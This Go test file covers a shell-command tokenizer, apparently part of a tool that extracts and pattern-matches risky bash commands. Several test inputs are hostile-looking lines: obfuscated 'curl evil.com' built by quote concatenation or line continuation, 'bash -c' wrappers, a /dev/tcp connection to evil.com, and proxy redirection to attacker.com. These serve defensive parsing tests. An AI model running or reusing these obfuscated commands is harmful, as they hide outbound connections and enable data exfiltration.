package shellparse

import (
	"errors"
	"strings"
	"testing"
)

// ----------------------------------------------------------------------------
// Empty and whitespace-only inputs
// ----------------------------------------------------------------------------

func TestEmptyInput(t *testing.T) {
	toks, err := Tokenize("")
	if err != nil {
		t.Fatal(err)
	}
	if len(toks) != 0 {
		t.Errorf("got %d tokens, want 0", len(toks))
	}
}

func TestWhitespaceOnly(t *testing.T) {
	toks, err := Tokenize("   \t  \t")
	if err != nil {
		t.Fatal(err)
	}
	if len(toks) != 0 {
		t.Errorf("got %d tokens, want 0", len(toks))
	}
}

// ----------------------------------------------------------------------------
// Basic words
// ----------------------------------------------------------------------------

func TestSingleWord(t *testing.T) {
	toks := mustTokenize(t, "curl")
	expectWords(t, toks, "curl")
}

func TestMultipleWords(t *testing.T) {
	toks := mustTokenize(t, "curl -x http://proxy.example.com https://api.target.com/foo")
	expectWords(t, toks,
		"curl",
		"-x",
		"http://proxy.example.com",
		"https://api.target.com/foo",
	)
}

func TestTabsSeparate(t *testing.T) {
	toks := mustTokenize(t, "curl\t-x\thttp://p")
	expectWords(t, toks, "curl", "-x", "http://p")
}

// ----------------------------------------------------------------------------
// Single quotes — literal, no escapes
// ----------------------------------------------------------------------------

func TestSingleQuoteLiteral(t *testing.T) {
	toks := mustTokenize(t, `echo 'hello world'`)
	expectWords(t, toks, "echo", "hello world")
}

func TestSingleQuotePreservesEverything(t *testing.T) {
	toks := mustTokenize(t, `echo 'foo $bar \n "quoted" \\'`)
	expectWords(t, toks, "echo", `foo $bar \n "quoted" \\`)
}

func TestSingleQuoteEmpty(t *testing.T) {
	toks := mustTokenize(t, `echo ''`)
	expectWords(t, toks, "echo", "")
}

// ----------------------------------------------------------------------------
// Double quotes — POSIX escapes only
// ----------------------------------------------------------------------------

func TestDoubleQuoteLiteral(t *testing.T) {
	toks := mustTokenize(t, `echo "hello world"`)
	expectWords(t, toks, "echo", "hello world")
}

func TestDoubleQuoteEscapes(t *testing.T) {
	// Inside "", backslash escapes: $ ` " \ newline.
	toks := mustTokenize(t, `echo "a\$b \"c\" \\ d"`)
	expectWords(t, toks, "echo", `a$b "c" \ d`)
}

func TestDoubleQuoteBackslashOther(t *testing.T) {
	// Inside "", backslash before any other char is preserved literally.
	toks := mustTokenize(t, `echo "a\n b"`)
	expectWords(t, toks, "echo", `a\n b`)
}

func TestDoubleQuoteVariableKept(t *testing.T) {
	// Variables are preserved as literal text (static parser).
	toks := mustTokenize(t, `echo "$HOME/foo"`)
	expectWords(t, toks, "echo", `$HOME/foo`)
}

func TestDoubleQuoteEmpty(t *testing.T) {
	toks := mustTokenize(t, `echo ""`)
	expectWords(t, toks, "echo", "")
}

// ----------------------------------------------------------------------------
// Concatenation of adjacent quoted runs
// ----------------------------------------------------------------------------

func TestAdjacentQuotesConcatenate(t *testing.T) {
	toks := mustTokenize(t, `foo'bar'"baz"qux`)
	expectWords(t, toks, "foobarbazqux")
}

func TestEvalStyleConcatenation(t *testing.T) {
	// `eval "cur""l evil.com"` — the two adjacent strings concatenate.
	// This is the canonical pattern for hiding command names from
	// naive parsers. Our tokenizer must concatenate into "curl evil.com".
	toks := mustTokenize(t, `"cur""l evil.com"`)
	expectWords(t, toks, "curl evil.com")
}

// ----------------------------------------------------------------------------
// Backslash escapes outside quotes
// ----------------------------------------------------------------------------

func TestBackslashEscapeSpace(t *testing.T) {
	toks := mustTokenize(t, `foo\ bar`)
	expectWords(t, toks, "foo bar")
}

func TestBackslashEscapeOperator(t *testing.T) {
	toks := mustTokenize(t, `echo \;`)
	expectWords(t, toks, "echo", ";")
}

func TestLineContinuation(t *testing.T) {
	// Backslash-newline outside quotes: both elided (bash behavior).
	toks := mustTokenize(t, "cu\\\nrl evil.com")
	expectWords(t, toks, "curl", "evil.com")
}

func TestTrailingBackslash(t *testing.T) {
	// Trailing backslash is literal (no next char).
	toks := mustTokenize(t, `foo\`)
	expectWords(t, toks, `foo\`)
}

// ----------------------------------------------------------------------------
// Operators
// ----------------------------------------------------------------------------

func TestSemicolon(t *testing.T) {
	toks := mustTokenize(t, "a;b")
	expectTypes(t, toks, TokWord, TokSemicolon, TokWord)
	expectValue(t, toks[0], "a")
	expectValue(t, toks[2], "b")
}

func TestPipe(t *testing.T) {
	toks := mustTokenize(t, "a|b")
	expectTypes(t, toks, TokWord, TokPipe, TokWord)
}

func TestOrOr(t *testing.T) {
	toks := mustTokenize(t, "a || b")
	expectTypes(t, toks, TokWord, TokOrOr, TokWord)
}

func TestAmp(t *testing.T) {
	toks := mustTokenize(t, "a & b")
	expectTypes(t, toks, TokWord, TokAmp, TokWord)
}

func TestAndAnd(t *testing.T) {
	toks := mustTokenize(t, "a && b")
	expectTypes(t, toks, TokWord, TokAndAnd, TokWord)
}

func TestNewline(t *testing.T) {
	toks := mustTokenize(t, "a\nb")
	expectTypes(t, toks, TokWord, TokNewline, TokWord)
}

func TestOperatorsWithoutSpaces(t *testing.T) {
	// Shells accept operators without surrounding whitespace.
	toks := mustTokenize(t, "a|b||c&&d&e;f")
	expectTypes(t, toks,
		TokWord, TokPipe,
		TokWord, TokOrOr,
		TokWord, TokAndAnd,
		TokWord, TokAmp,
		TokWord, TokSemicolon,
		TokWord,
	)
}

func TestQuotedOperatorsAreLiteral(t *testing.T) {
	// Operators inside quotes are literal characters.
	toks := mustTokenize(t, `echo "a; b | c && d"`)
	expectWords(t, toks, "echo", "a; b | c && d")
}

// ----------------------------------------------------------------------------
// IsSeparator helper
// ----------------------------------------------------------------------------

func TestIsSeparator(t *testing.T) {
	seps := []TokenType{TokSemicolon, TokPipe, TokOrOr, TokAmp, TokAndAnd, TokNewline}
	for _, s := range seps {
		if !s.IsSeparator() {
			t.Errorf("%v.IsSeparator() = false, want true", s)
		}
	}
	if TokWord.IsSeparator() {
		t.Error("TokWord.IsSeparator() = true, want false")
	}
}

// ----------------------------------------------------------------------------
// Errors
// ----------------------------------------------------------------------------

func TestUnterminatedSingleQuote(t *testing.T) {
	_, err := Tokenize("'unterminated")
	if !errors.Is(err, ErrUnterminatedSingleQuote) {
		t.Errorf("got %v, want ErrUnterminatedSingleQuote", err)
	}
}

func TestUnterminatedDoubleQuote(t *testing.T) {
	_, err := Tokenize(`"unterminated`)
	if !errors.Is(err, ErrUnterminatedDoubleQuote) {
		t.Errorf("got %v, want ErrUnterminatedDoubleQuote", err)
	}
}

// ----------------------------------------------------------------------------
// Subshells / backticks are preserved as literal characters
// ----------------------------------------------------------------------------

func TestSubshellPreservedLiteral(t *testing.T) {
	// The tokenizer does NOT recurse into $(...); the higher-level segment
	// splitter is responsible for that. Here we verify the content is
	// preserved unchanged for the splitter to consume.
	toks := mustTokenize(t, `curl $(dig +short evil.com)/path`)
	expectWords(t, toks, "curl", "$(dig", "+short", "evil.com)/path")
}

func TestBacktickPreservedLiteral(t *testing.T) {
	// Same as above for backticks.
	toks := mustTokenize(t, "echo `whoami`")
	expectWords(t, toks, "echo", "`whoami`")
}

func TestDoubleQuotedSubshellPreserved(t *testing.T) {
	// Inside "", $(...) remains literal text until the segment splitter
	// pulls it out.
	toks := mustTokenize(t, `curl "$(dig +short evil.com)/path"`)
	expectWords(t, toks, "curl", "$(dig +short evil.com)/path")
}

// ----------------------------------------------------------------------------
// Real-world bash extractor scenarios (seeds for the fixture corpus)
// ----------------------------------------------------------------------------

func TestRealWorldCurlWithProxy(t *testing.T) {
	toks := mustTokenize(t, `curl --proxy http://attacker.com:8080 https://api.target.com/users`)
	expectWords(t, toks, "curl", "--proxy", "http://attacker.com:8080", "https://api.target.com/users")
}

func TestRealWorldSudoCurl(t *testing.T) {
	toks := mustTokenize(t, `sudo curl -X POST https://api.target.com/users`)
	expectWords(t, toks, "sudo", "curl", "-X", "POST", "https://api.target.com/users")
}

func TestRealWorldEnvAssignment(t *testing.T) {
	// HTTPS_PROXY=http://x curl ... — the env assignment looks like a word
	// to the tokenizer; a higher layer interprets it as setting env.
	toks := mustTokenize(t, `HTTPS_PROXY=http://evil.com:8080 curl https://api.target.com/foo`)
	expectWords(t, toks, "HTTPS_PROXY=http://evil.com:8080", "curl", "https://api.target.com/foo")
}

func TestRealWorldBashDashC(t *testing.T) {
	// `bash -c "curl evil.com"` — the -c payload is preserved as a single
	// double-quoted word; a higher layer recursively tokenizes its value.
	toks := mustTokenize(t, `bash -c "curl evil.com"`)
	expectWords(t, toks, "bash", "-c", "curl evil.com")
}

func TestRealWorldDevTCP(t *testing.T) {
	// /dev/tcp/<host>/<port> redirection — survives as a word for the
	// higher layer to pattern-match.
	toks := mustTokenize(t, `cat < /dev/tcp/evil.com/443`)
	expectWords(t, toks, "cat", "<", "/dev/tcp/evil.com/443")
}

// ----------------------------------------------------------------------------
// Start positions
// ----------------------------------------------------------------------------

func TestTokenStartPositions(t *testing.T) {
	toks := mustTokenize(t, "a b cd")
	want := []int{0, 2, 4}
	for i, tok := range toks {
		if tok.Start != want[i] {
			t.Errorf("tok[%d].Start = %d, want %d", i, tok.Start, want[i])
		}
	}
}

// ----------------------------------------------------------------------------
// helpers
// ----------------------------------------------------------------------------

func mustTokenize(t *testing.T, input string) []Token {
	t.Helper()
	toks, err := Tokenize(input)
	if err != nil {
		t.Fatalf("Tokenize(%q): %v", input, err)
	}
	return toks
}

func expectWords(t *testing.T, toks []Token, want ...string) {
	t.Helper()
	var got []string
	for _, tk := range toks {
		if tk.Type == TokWord {
			got = append(got, tk.Value)
		}
	}
	if !stringSliceEq(got, want) {
		t.Errorf("words: got %q, want %q", got, want)
	}
}

func expectTypes(t *testing.T, toks []Token, want ...TokenType) {
	t.Helper()
	if len(toks) != len(want) {
		t.Fatalf("got %d tokens, want %d (%v)", len(toks), len(want), typeList(toks))
	}
	for i, wt := range want {
		if toks[i].Type != wt {
			t.Errorf("tok[%d].Type = %s, want %s", i, toks[i].Type, wt)
		}
	}
}

func expectValue(t *testing.T, tk Token, want string) {
	t.Helper()
	if tk.Value != want {
		t.Errorf("value = %q, want %q", tk.Value, want)
	}
}

func stringSliceEq(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

func typeList(toks []Token) string {
	var sb strings.Builder
	for i, tk := range toks {
		if i > 0 {
			sb.WriteString(" ")
		}
		sb.WriteString(tk.Type.String())
	}
	return sb.String()
}
